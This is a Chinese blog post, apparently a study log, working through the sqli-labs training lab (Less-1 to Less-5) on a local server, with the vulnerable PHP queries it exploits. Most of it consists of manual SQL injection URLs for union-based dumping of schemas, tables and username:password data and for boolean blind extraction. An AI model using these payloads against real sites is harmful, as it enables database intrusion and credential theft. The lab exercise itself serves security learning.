<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>sqli-labs 刷题记录 | Evo1ution's blog</title><meta name="keywords" content="Web,CTF,sql注入"><meta name="author" content="Evo1ution"><meta name="copyright" content="Evo1ution"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="sqli-labs 刷题记录 参考： MYSQL注入天书  此文尽量使用手工注入以加深对原理的理解，竭力避免了使用sqlmap或者脚本自动化注入等方式。 Page-1 (Basic Challenges)Less-1 GET - Error based - Single quotes - String (基于错误的GET单引号字符型注入)手动注入进去之后发现让输入id，随便输一个数字id发现都可以">
<meta property="og:type" content="article">
<meta property="og:title" content="sqli-labs 刷题记录">
<meta property="og:url" content="https://evolution957.github.io/2022/05/17/sqli-labs/index.html">
<meta property="og:site_name" content="Evo1ution&#39;s blog">
<meta property="og:description" content="sqli-labs 刷题记录 参考： MYSQL注入天书  此文尽量使用手工注入以加深对原理的理解，竭力避免了使用sqlmap或者脚本自动化注入等方式。 Page-1 (Basic Challenges)Less-1 GET - Error based - Single quotes - String (基于错误的GET单引号字符型注入)手动注入进去之后发现让输入id，随便输一个数字id发现都可以">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img.gejiba.com/images/b679a24981fd5cace80446bbac9ea233.jpg">
<meta property="article:published_time" content="2022-05-17T15:52:49.000Z">
<meta property="article:modified_time" content="2022-05-17T15:52:49.000Z">
<meta property="article:author" content="Evo1ution">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="sql注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img.gejiba.com/images/b679a24981fd5cace80446bbac9ea233.jpg"><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="https://evolution957.github.io/2022/05/17/sqli-labs/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'sqli-labs 刷题记录',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-17 23:52:49'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/iconfont.css"><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Evo1ution's blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img.gejiba.com/images/b679a24981fd5cace80446bbac9ea233.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Evo1ution's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sqli-labs 刷题记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-05-17T15:52:49.000Z" title="发表于 2022-05-17 23:52:49">2022-05-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-05-17T15:52:49.000Z" title="更新于 2022-05-17 23:52:49">2022-05-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-Web/">CTF_Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sqli-labs 刷题记录"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="sqli-labs-刷题记录"><a href="#sqli-labs-刷题记录" class="headerlink" title="sqli-labs 刷题记录"></a>sqli-labs 刷题记录</h1><blockquote>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/category/846064.html">MYSQL注入天书</a></p>
</blockquote>
<p>此文尽量使用手工注入以加深对原理的理解，竭力避免了使用sqlmap或者脚本自动化注入等方式。</p>
<h2 id="Page-1-Basic-Challenges"><a href="#Page-1-Basic-Challenges" class="headerlink" title="Page-1 (Basic Challenges)"></a>Page-1 (Basic Challenges)</h2><h3 id="Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 GET - Error based - Single quotes - String (基于错误的GET单引号字符型注入)"></a>Less-1 GET - Error based - Single quotes - String (基于错误的GET单引号字符型注入)</h3><h4 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h4><p>进去之后发现让输入id，随便输一个数字id发现都可以正常回显，然后尝试注入</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/M4r9ztPgwYUuNdL.png" alt="1_1.png"></p>
<p>根据报错信息猜测原语句是用<code>&#39;$id&#39;</code>来处理的输入，故用<code>&#39;</code>闭合即可。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=1&#x27; <span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/X1JuzWeRH5GcntV.png" alt="1_2.png"></p>
<p>正常回显，故用<code>order by</code>爆出列数，发现有3列(4时报错)</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=1&#x27; <span class="attribute">order</span> by <span class="number">4</span>--+</span><br></pre></td></tr></table></figure>

<p>然后开始爆库名</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/639kfQjuw8qMStc.png" alt="1_3.png"></p>
<p>发现<code>security</code>数据库，开始爆表名</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/YLH869CSsQAWbE5.png" alt="1_4.png"></p>
<p>爆<code>users</code>表里的列名</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/fbgWAv5Ir68DTdY.png" alt="1_5.png"></p>
<p>爆出表里的所有数据</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/Uc5l39PbvWEoXCG.png" alt="1_6.png"></p>
<p>很好，我们终于达到了和不断直接输入<code>?id=xxxxx</code>相同的效果hhh😄</p>
<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>把传入的<code>$id</code>直接当作字符串拼接了进来，故只需要用<code>&#39;</code>闭合掉前面的引号，然后用<code>--+</code>注释掉后面的语句即可完成注入</p>
<h3 id="Less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><a href="#Less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入" class="headerlink" title="Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)"></a>Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)</h3><h4 id="手动注入-1"><a href="#手动注入-1" class="headerlink" title="手动注入"></a>手动注入</h4><p>输入<code>?id=1&#39;</code>观察报错</p>
<p><img src="https://s2.loli.net/2022/05/17/6cSxRIwZXdgPE1r.png" alt="2.png"></p>
<p>根据报错猜测是未用<code>&#39;&#39;</code>包裹<code>$id</code>，直接对输入进行拼接，故与less-1相比只需去掉数字后的<code>&#39;</code>即可。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#尝试</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 <span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br><span class="line"><span class="comment">#爆列数</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">2</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">4</span>--+</span><br><span class="line"><span class="comment">#爆库名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br><span class="line"><span class="comment">#爆表名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆列名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆数据</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到直接把<code>$id</code>拼接了进来。</p>
<h3 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h3><h4 id="手动注入-2"><a href="#手动注入-2" class="headerlink" title="手动注入"></a>手动注入</h4><p>输入<code>?id=1&#39;</code>观察报错</p>
<p><img src="https://s2.loli.net/2022/05/17/SefyJM3Dud15Pk6.png" alt="3.png"></p>
<p>根据报错猜测原语句是<code>(&#39;$id&#39;)</code>，故只需用<code>&#39;)</code>来闭合即可。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#尝试</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)--+</span><br><span class="line"><span class="comment">#爆列数</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)<span class="attribute">order</span> by <span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)order by <span class="number">2</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)order by <span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)order by <span class="number">4</span>--+</span><br><span class="line"><span class="comment">#爆库名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br><span class="line"><span class="comment">#爆表名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆列名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆数据</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-4-GET-Error-based-Double-Quotes-String-基于错误的GET双引号字符型注入"><a href="#Less-4-GET-Error-based-Double-Quotes-String-基于错误的GET双引号字符型注入" class="headerlink" title="Less-4 GET - Error based - Double Quotes - String (基于错误的GET双引号字符型注入)"></a>Less-4 GET - Error based - Double Quotes - String (基于错误的GET双引号字符型注入)</h3><h4 id="手动注入-3"><a href="#手动注入-3" class="headerlink" title="手动注入"></a>手动注入</h4><p>还是输入<code>?id=1&#39;</code>，发现能正常显示，故使用<code>?id=1&quot;</code>进行尝试</p>
<p><img src="https://s2.loli.net/2022/05/17/b7qLRYUfVed6hnW.png" alt="4.png"></p>
<p>根据报错猜测原语句是<code>(&quot;$id&quot;)</code>，故只需用<code>&quot;)</code>来闭合即可。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#尝试</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)--+</span><br><span class="line"><span class="comment">#爆列数</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)<span class="attribute">order</span> by <span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)order by <span class="number">2</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)order by <span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)order by <span class="number">4</span>--+</span><br><span class="line"><span class="comment">#爆库名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br><span class="line"><span class="comment">#爆表名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆列名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆数据</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-3"><a href="#源码分析-3" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入" class="headerlink" title="Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)"></a>Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</h3><h4 id="源码分析-4"><a href="#源码分析-4" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>与less-1一样用<code>&#39;&#39;</code>对输入进行处理来拼接，不同的是输入正确后不在显示数据库信息，而报错信息却能正确回显，此处将使用多种方式完成注入，以通过此关来学习各种注入方法及函数利用。</p>
<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><h5 id="利用left-和length-函数获取版本号及库名"><a href="#利用left-和length-函数获取版本号及库名" class="headerlink" title="利用left()和length()函数获取版本号及库名"></a>利用left()和length()函数获取版本号及库名</h5><p>逐位进行字符对比，如果正确则能看到<code>You are in...........</code>正确显示，否则不能。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆版本号，我的数据库版本是10.4.11-MariaDB</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> left(version(),<span class="number">1</span>)=<span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(version(),<span class="number">2</span>)=<span class="number">10</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(version(),<span class="number">15</span>)=<span class="string">&#x27;10.4.11-MariaDB&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆库长</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and length(database())=<span class="number">8</span>--+</span><br><span class="line"><span class="comment">#爆库名，使用的数据库名称为security，先看第一位是不是大于a,然后逐位尝试</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(database(),<span class="number">1</span>)&gt;<span class="string">&#x27;a&#x27;</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(database(),<span class="number">8</span>)=<span class="string">&#x27;security&#x27;</span>--+</span><br></pre></td></tr></table></figure>

<h5 id="利用substr-和ascii-函数获取表名"><a href="#利用substr-和ascii-函数获取表名" class="headerlink" title="利用substr()和ascii()函数获取表名"></a>利用substr()和ascii()函数获取表名</h5><p>逐位对比，如果正确则能看到<code>You are in...........</code>正确显示，否则不能。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆表名，这里第一个表是emails，使用的数据库是security</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">109</span>--+</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆出第一个字符后挨个爆破剩余字符，最后获取第一个表名，如果想获取第二个，只需要修改limit后的内容即可</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>--+</span><br></pre></td></tr></table></figure>

<h5 id="利用regexp-函数获取列名字"><a href="#利用regexp-函数获取列名字" class="headerlink" title="利用regexp()函数获取列名字"></a>利用regexp()函数获取列名字</h5><p>正则匹配，如果正确则能看到<code>You are in...........</code>正确显示，否则不能。</p>
